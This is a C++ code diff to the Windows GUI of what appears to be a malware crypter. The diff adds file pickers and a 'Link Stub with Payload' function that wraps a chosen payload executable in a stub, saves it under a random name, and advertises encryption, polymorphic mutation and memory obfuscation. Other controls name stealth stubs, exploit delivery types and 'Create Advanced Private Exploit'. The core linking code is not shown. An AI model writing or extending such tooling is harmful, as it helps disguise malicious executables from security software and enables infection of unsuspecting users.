@@ -112,8 +112,13 @@ constexpr int ID_STEALTH_DECIMAL_KEYS_CHECK = 1048;
 constexpr int ID_STEALTH_RANDOM_ORDER_CHECK = 1049;
 constexpr int ID_STEALTH_DYNAMIC_ENTROPY_CHECK = 1050;
 constexpr int ID_CREATE_STEALTH_STUB = 1051;
-constexpr int ID_STUB_LINKER_ENABLE_CHECK = 1052;
-constexpr int ID_LINK_STUB_WITH_PAYLOAD = 1053;
+
+// StubLinker GUI Control IDs
+constexpr int ID_STUB_LINKER_SOURCE_EDIT = 1052;
+constexpr int ID_STUB_LINKER_SOURCE_BROWSE = 1053;
+constexpr int ID_STUB_LINKER_TARGET_EDIT = 1054;
+constexpr int ID_STUB_LINKER_TARGET_BROWSE = 1055;
+constexpr int ID_CREATE_LINKED_STUB = 1056;
 
 // Global variables for mass generation
 bool g_massGenerationActive = false;
@@ -159,9 +164,12 @@ HWND g_hStealthDecimalKeysCheck;
 HWND g_hStealthRandomOrderCheck;
 HWND g_hStealthDynamicEntropyCheck;
 
-// Stub Linker controls
-HWND g_hStubLinkerEnableCheck;
-HWND g_hLinkStubWithPayloadButton;
+// StubLinker GUI controls
+HWND g_hStubLinkerSourceEdit;
+HWND g_hStubLinkerSourceBrowse;
+HWND g_hStubLinkerTargetEdit;
+HWND g_hStubLinkerTargetBrowse;
+HWND g_hCreateLinkedStub;
 HWND g_hCreateStealthStubButton;
 
 // Exploit Delivery Types
@@ -3693,23 +3701,34 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                                                       10, 780, 220, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_STEALTH_STUB, NULL, NULL);
             
             // Stub Linker Controls
-            g_hStubLinkerEnableCheck = CreateWindowW(L"BUTTON", L"Enable Stub Linker", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
-                                                    240, 780, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_STUB_LINKER_ENABLE_CHECK, NULL, NULL);
+            CreateWindowW(L"STATIC", L"Stub Linker - Source Stub:", WS_VISIBLE | WS_CHILD,
+                         240, 780, 150, 20, hwnd, NULL, NULL, NULL);
+            g_hStubLinkerSourceEdit = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
+                                                   240, 800, 200, 25, hwnd, (HMENU)(UINT_PTR)ID_STUB_LINKER_SOURCE_EDIT, NULL, NULL);
+            g_hStubLinkerSourceBrowse = CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                                     450, 800, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_STUB_LINKER_SOURCE_BROWSE, NULL, NULL);
             
-            g_hLinkStubWithPayloadButton = CreateWindowW(L"BUTTON", L"Link Stub with Payload", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                                                        370, 775, 150, 30, hwnd, (HMENU)(UINT_PTR)ID_LINK_STUB_WITH_PAYLOAD, NULL, NULL);
+            CreateWindowW(L"STATIC", L"Target Payload:", WS_VISIBLE | WS_CHILD,
+                         240, 830, 100, 20, hwnd, NULL, NULL, NULL);
+            g_hStubLinkerTargetEdit = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
+                                                   240, 850, 200, 25, hwnd, (HMENU)(UINT_PTR)ID_STUB_LINKER_TARGET_EDIT, NULL, NULL);
+            g_hStubLinkerTargetBrowse = CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                                     450, 850, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_STUB_LINKER_TARGET_BROWSE, NULL, NULL);
             
-            // Custom icon input (moved down)
+            g_hCreateLinkedStub = CreateWindowW(L"BUTTON", L"Link Stub with Payload", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                               240, 880, 180, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_LINKED_STUB, NULL, NULL);
+            
+            // Custom icon input (moved down further)
             CreateWindowW(L"STATIC", L"Custom Icon:", WS_VISIBLE | WS_CHILD,
-                         10, 815, 80, 20, hwnd, NULL, NULL, NULL);
+                         10, 920, 80, 20, hwnd, NULL, NULL, NULL);
             g_hCustomIconEdit = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
-                                             95, 812, 280, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_EDIT, NULL, NULL);
+                                             95, 917, 280, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_EDIT, NULL, NULL);
             g_hCustomIconBrowse = CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                                               385, 812, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_BROWSE, NULL, NULL);
+                                               385, 917, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_BROWSE, NULL, NULL);
             
-            // Advanced exploit creation button (moved down)
+            // Advanced exploit creation button (moved down further)
             CreateWindowW(L"BUTTON", L"Create Advanced Private Exploit", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                         10, 845, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_ADVANCED_EXPLOIT, NULL, NULL);
+                         10, 950, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_ADVANCED_EXPLOIT, NULL, NULL);
             
             // Enable drag and drop
             DragAcceptFiles(hwnd, TRUE);
@@ -3804,9 +3823,21 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                     break;
                 }
                 
-                case ID_LINK_STUB_WITH_PAYLOAD: {
+                case ID_STUB_LINKER_SOURCE_BROWSE: {
+                    // Browse for source stub file
+                    browseForStubLinkerSource();
+                    break;
+                }
+                
+                case ID_STUB_LINKER_TARGET_BROWSE: {
+                    // Browse for target payload file
+                    browseForStubLinkerTarget();
+                    break;
+                }
+                
+                case ID_CREATE_LINKED_STUB: {
                     // Link stub with payload using StubLinker
-                    std::thread(linkStubWithPayload).detach();
+                    std::thread(createLinkedStub).detach();
                     break;
                 }
                 
@@ -4392,6 +4423,137 @@ static void createStealthTripleEncryptedStub() {
         
     } catch (const std::exception& e) {
         std::string errorMsg = "Error creating stealth stub: " + std::string(e.what());
+        std::wstring wErrorMsg(errorMsg.begin(), errorMsg.end());
+        SetWindowTextW(g_hStatusText, wErrorMsg.c_str());
+        MessageBoxW(NULL, wErrorMsg.c_str(), L"Error", MB_OK | MB_ICONERROR);
+    }
+    
+    // Re-enable button
+    EnableWindow(g_hCreateButton, TRUE);
+}
+
+// Browse for source stub file for StubLinker
+static void browseForStubLinkerSource() {
+    OPENFILENAMEW ofn;
+    wchar_t szFile[MAX_PATH] = {0};
+    
+    ZeroMemory(&ofn, sizeof(ofn));
+    ofn.lStructSize = sizeof(ofn);
+    ofn.lpstrFile = szFile;
+    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
+    ofn.lpstrFilter = L"Executable Files\0*.exe\0C++ Source Files\0*.cpp\0All Files\0*.*\0";
+    ofn.nFilterIndex = 1;
+    ofn.lpstrFileTitle = NULL;
+    ofn.nMaxFileTitle = 0;
+    ofn.lpstrInitialDir = NULL;
+    ofn.lpstrTitle = L"Select Source Stub File";
+    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
+    
+    if (GetOpenFileNameW(&ofn)) {
+        SetWindowTextW(g_hStubLinkerSourceEdit, szFile);
+    }
+}
+
+// Browse for target payload file for StubLinker
+static void browseForStubLinkerTarget() {
+    OPENFILENAMEW ofn;
+    wchar_t szFile[MAX_PATH] = {0};
+    
+    ZeroMemory(&ofn, sizeof(ofn));
+    ofn.lStructSize = sizeof(ofn);
+    ofn.lpstrFile = szFile;
+    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
+    ofn.lpstrFilter = L"Executable Files\0*.exe\0All Files\0*.*\0";
+    ofn.nFilterIndex = 1;
+    ofn.lpstrFileTitle = NULL;
+    ofn.nMaxFileTitle = 0;
+    ofn.lpstrInitialDir = NULL;
+    ofn.lpstrTitle = L"Select Target Payload File";
+    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
+    
+    if (GetOpenFileNameW(&ofn)) {
+        SetWindowTextW(g_hStubLinkerTargetEdit, szFile);
+    }
+}
+
+// Function to create linked stub using StubLinker
+static void createLinkedStub() {
+    // Update status and disable button
+    SetWindowTextW(g_hStatusText, L"Creating linked stub...");
+    EnableWindow(g_hCreateButton, FALSE);
+    
+    try {
+        // Get source stub path
+        wchar_t sourceBuffer[MAX_PATH] = {0};
+        GetWindowTextW(g_hStubLinkerSourceEdit, sourceBuffer, MAX_PATH);
+        std::string sourcePath = wstringToString(std::wstring(sourceBuffer));
+        (void)sourceBuffer; // Suppress unused variable warning
+        
+        if (sourcePath.empty()) {
+            MessageBoxW(NULL, L"Please select a source stub file.", L"Error", MB_OK | MB_ICONWARNING);
+            EnableWindow(g_hCreateButton, TRUE);
+            return;
+        }
+        
+        // Get target payload path
+        wchar_t targetBuffer[MAX_PATH] = {0};
+        GetWindowTextW(g_hStubLinkerTargetEdit, targetBuffer, MAX_PATH);
+        std::string targetPath = wstringToString(std::wstring(targetBuffer));
+        (void)targetBuffer; // Suppress unused variable warning
+        
+        if (targetPath.empty()) {
+            MessageBoxW(NULL, L"Please select a target payload file.", L"Error", MB_OK | MB_ICONWARNING);
+            EnableWindow(g_hCreateButton, TRUE);
+            return;
+        }
+        
+        // Get output path from GUI
+        wchar_t outputBuffer[MAX_PATH] = {0};
+        GetWindowTextW(g_hOutputPath, outputBuffer, MAX_PATH);
+        std::string outputPath = wstringToString(std::wstring(outputBuffer));
+        (void)outputBuffer; // Suppress unused variable warning
+        
+        if (outputPath.empty()) {
+            // Auto-generate output path for linked stub
+            std::string randomName = g_packer.randomEngine.generateRandomName();
+            outputPath = "Linked_Stub_" + randomName + ".exe";
+            
+            // Update the GUI with the auto-generated path
+            std::wstring wOutputPath(outputPath.begin(), outputPath.end());
+            SetWindowTextW(g_hOutputPath, wOutputPath.c_str());
+        } else {
+            // Ensure .exe extension for linked stub
+            if (outputPath.length() < 4 || outputPath.substr(outputPath.length() - 4) != ".exe") {
+                outputPath += ".exe";
+                std::wstring wOutputPath(outputPath.begin(), outputPath.end());
+                SetWindowTextW(g_hOutputPath, wOutputPath.c_str());
+            }
+        }
+        
+        // Use StubLinker to link the stub with the payload
+        bool success = g_packer.stubLinker.linkStubWithExecutable(sourcePath, targetPath, outputPath);
+        
+        if (!success) {
+            throw std::runtime_error("Failed to link stub with payload");
+        }
+        
+        // Update status with success message
+        std::wstring successMsg = L"Linked stub created successfully!\nFile: ";
+        std::wstring wOutputPath(outputPath.begin(), outputPath.end());
+        successMsg += wOutputPath;
+        
+        // Add feature summary
+        successMsg += L"\n\nFeatures:";
+        successMsg += L"\n• Key extraction from source stub";
+        successMsg += L"\n• AES-128-CTR encryption";
+        successMsg += L"\n• Polymorphic code mutation";
+        successMsg += L"\n• Memory layout obfuscation";
+        
+        SetWindowTextW(g_hStatusText, successMsg.c_str());
+        MessageBoxW(NULL, successMsg.c_str(), L"Success", MB_OK | MB_ICONINFORMATION);
+        
+    } catch (const std::exception& e) {
+        std::string errorMsg = "Error creating linked stub: " + std::string(e.what());
         std::wstring wErrorMsg(errorMsg.begin(), errorMsg.end());
         SetWindowTextW(g_hStatusText, wErrorMsg.c_str());
         MessageBoxW(NULL, wErrorMsg.c_str(), L"Error", MB_OK | MB_ICONERROR);
